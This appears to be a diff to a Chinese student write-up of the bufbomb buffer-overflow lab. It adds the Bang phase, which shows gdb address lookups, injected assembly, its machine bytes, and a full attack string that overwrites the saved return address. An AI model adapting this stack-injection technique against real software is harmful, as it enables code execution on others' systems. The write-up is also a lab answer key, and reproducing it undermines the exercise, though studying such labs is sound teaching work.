@@ -28,6 +28,7 @@ $ ./bufbomb -u U201414800 < smoke_ U201414800_raw.txt
 
 #### Attack
 
+
 ```bash
 $ gcc -m32 -c attack.s
 $ objdump -d attack.o >> attack.asm
@@ -40,9 +41,9 @@ $ objdump -d attack.o >> attack.asm
 -   编写 Makefile，简化工作流
 
 ```makefile
-# 分析反汇编代码
+# 获取可执行目标文件所有节的反汇编信息, 分析反汇编代码
 dump:
-	objdump -d bufbomb > bufbomb.asm && vim bufbomb.asm
+	objdump -D bufbomb > bufbomb.asm && vim bufbomb.asm
 
 # 分析 bufbomb C源码
 src:
@@ -168,4 +169,81 @@ make test
 
 0x28+0x4(%ebp)+0x4(return address)+0x8(first argument) = 56 bytes
 
+故需在第一阶段的攻击字符串的基础上添加 00 00 00 00 90 ac 98 68
+
 > 使用 gdb 进行调试时，发现不能像以往那样在某一行设置断点，只能在某些函数处设置断点.故 (gdb) b getbuf, 在 getbuf 函数处设置断点
+
+## Bang Phase
+
+### 获取输入缓冲区地址,控制 getbuf 返回后跳转至攻击指令处
+
+键入 (gdb) b getbuf, 在 getbuf 处设置断点，使程序运行至 getbuf处.
+键入 x/wx $ebp-0x28, 输出0x55683188 <_reserved+1036680>:    0x00000000,
+可得输入缓冲区的首址为 0x55683188, 故利用攻击字符串将攻击程序写入在此开始的 28 个字节内.
+故应将 getbuf 栈帧返回地址处覆写为 88 31 68 55.
+
+### 获取 `global_value` 地址, 利用汇编攻击指令将其修改为 cookie 值
+
+键入 make dump , 利用 vim 编辑器在 bufbump.asm 中搜索 `global_value`, 发现其位于 .bss 节,地址为 0x0804c218.
+可编写如下指令改变 `global_value` 值:
+
+```asm
+movl $0x6898ac90, 0x0804c218
+```
+
+可将 `global_value` 值修改为 cookie 值.
+
+### 利用汇编攻击指令跳转至 bang 函数
+
+同样地, 键入 make dump, 利用 vim 编辑器在 bufbump.asm 中搜索 `bang`, 其地址为 0x08048d05.
+
+```asm
+pushl $0x08048d05
+ret
+```
+
+可跳转至 bang 函数处
+
+### 生成 bang 攻击字符串
+
+键入 $ vim attack.s, 编写汇编攻击指令
+
+```asm
+movl $0x6898ac90, 0x0804c218
+pushl $0x08048d05
+ret
+```
+
+键入 $ make asm, 将汇编指令编译成重定位目标文件(attack.o), 再将其反汇编成带机器指令码的汇编指令(attack.asm), 查看 attack.asm 可得
+
+```asm
+c7 05 18 c2 04 08 90    movl   $0x6898ac90,0x804c218    
+ac 98 68 
+68 05 8d 04 08          push   $0x8048d05
+c3                      ret 
+```
+
+故,可得攻击指令机器字节码为 c7 05 18 c2 04 08 90 ac 98 68 68 05 8d 04 08 c3.
+
+### bang 最终攻击序列
+
+```asm
+c7 05 18 c2
+04 08 90 ac
+98 68 68 05
+8d 04 08 c3
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+88 31 68 55
+```
+
+## Bug 
+
+### Stupid Bug
+
+在进行 bang 阶段的攻击时，由于在倒数第二行添加注释时，后半部分注释与 */ 间没有空格，导致解析错误，只成功将攻击指令注入了输入缓冲区，但没有成功修改 getbuf 栈帧的返回地址，导致 getbuf 正常返回，攻击失败。
